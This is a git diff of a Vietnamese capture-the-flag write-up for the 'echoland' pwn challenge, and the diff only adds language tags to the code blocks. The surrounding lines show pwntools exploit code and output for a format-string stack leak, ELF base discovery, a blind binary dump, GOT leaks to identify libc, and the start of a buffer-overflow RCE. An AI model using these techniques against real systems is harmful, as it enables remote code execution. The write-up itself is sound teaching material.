@@ -46,7 +46,7 @@ Your friend did not recognize you and ran the other way!
 ```
 ## Leaking stack frame
 Xem stack frame thử coi có gì?
-```
+```python
 from pwn import *
 
 p = remote('154.57.164.76', 31818)
@@ -57,7 +57,7 @@ for k in range(20):
     print(f'{k}: {leak}')
 ```
 Output:
-```
+```bash
 $ python3 exploit.py
 [+] Opening connection to 154.57.164.76 on port 31818: Done
 0: %0$p
@@ -109,7 +109,7 @@ Dựa vào output thì mình biết được buffer đầu vào của nó nằm 
 ## Leaking exe base
 Lấy giá trị base của exe bằng cách trừ offset cho đến khi nào mình đọc được giá trị magic byte của file ELF. 
 
-```
+```python
 def leak_base_exe(exe_base):
     while True:
         info('Test exe base: ' + hex(exe_base))
@@ -125,7 +125,7 @@ def leak_base_exe(exe_base):
 leak_base_exe(exe_base)
 ```
 Output:
-```
+```bash
 $ python3 exploit.py
 [+] Opening connection to 154.57.164.76 on port 31818: Done
 [*] Leak exe: 0x55607a0da000
@@ -139,7 +139,7 @@ b'\x7fELF\x02\x01\x01AAAA\n'
 ## Dumping binary file
 Mình dùng code của [blog](https://fdlucifer.github.io/2021/12/11/echoland/). Tuy nhiên, nó không chạy đúng với trường hợp ở bài này, nên mình có vibe coding lại. Quá trình leak file ELF hơi lâu vì dump nguyên source code để phân tích @@
 
-```
+```python
 def dump_binary(exe_base):
     base = exe_base
     leak,leaked = bytearray(),bytearray()
@@ -159,7 +159,7 @@ def dump_binary(exe_base):
             offset = len(leaked)
 ```
 Output:
-```
+```bash
 $ python3 exploit.py
 [+] Opening connection to 154.57.164.76 on port 31818: Done
 [*] Leak exe: 0x55eca85bb000
@@ -191,7 +191,7 @@ $ file echoland.bin
 echoland.bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, too large section header offset 2594073387297144832
 ```
 Main function:
-```
+```c
 __int64 __fastcall sub_12EF()
 {
   _BYTE *v0; // rdi
@@ -242,7 +242,7 @@ Ta đoán được:
 | sub_1150 | exit    |  3FD0  |
 
 Bên cạnh đó, mình còn phát hiện được bug overflow.
-```
+```c
 __int64 sub_12A7()
 {
   _BYTE v1[64]; // [rsp+0h] [rbp-40h] BYREF
@@ -256,7 +256,7 @@ Kiểm tra thử xem
 ![alt text](trigger_bof.png)
 ## Finding the version of libc
 Leaking...
-```
+```python3
 def leak_got_address(name, offset):
     global exe_base
     # leak_exe_address()
@@ -275,7 +275,7 @@ leak_got_address('read', 0x3Fb8)
 leak_got_address('exit', 0x3Fd0)
 ```
 Output:
-```
+```bash
 $ python3 exploit.py
 [+] Opening connection to 154.57.164.62 on port 32275: Done
 [*] Leak exe: 0x556fea8be000
@@ -290,7 +290,7 @@ $ python3 exploit.py
 Tìm được 2 phiên bản libc, cả hai đều có chuỗi "/bin/sh" và "system" có offset như nhau nên chọn cái nào cũng được.
 ![alt text](bluekatme.png)
 ## RCE
-```
+```python
 from pwn import *
 
 p = remote('154.57.164.62', 32275)
